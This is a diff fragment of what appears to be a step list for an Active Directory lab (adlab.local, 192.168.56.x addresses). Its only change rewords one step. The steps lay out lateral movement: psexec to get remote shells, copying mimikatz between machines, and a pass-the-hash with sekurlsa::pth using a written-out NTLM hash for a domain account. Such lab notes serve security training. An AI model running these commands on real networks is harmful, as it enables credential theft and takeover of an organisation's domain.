@@ -8,7 +8,7 @@
 5. In the new shell: Confirm by `dir \\192.168.56.30\c$` or whatever the ip is
 6. `psexec /accepteula -r random_naam \\192.168.56.30 cmd`
 7. Confirm you're in by typing `hostname` in the shell
-8. Copy C drive to X drive to get mimikatz
+8. Copy C drive (client) to X drive (admin) to get mimikatz
 9. Do another pass the hash (get the ip with a scanner or something)
 10. Confirm you're in by `dir \\192.168.56.10\c$` or whatever the ip is
 11. ``sekurlsa::pth /user:domad /ntlm:cff48581d56085119bddffacfae51aeb /domain:adlab.local /run:cmd.exe`
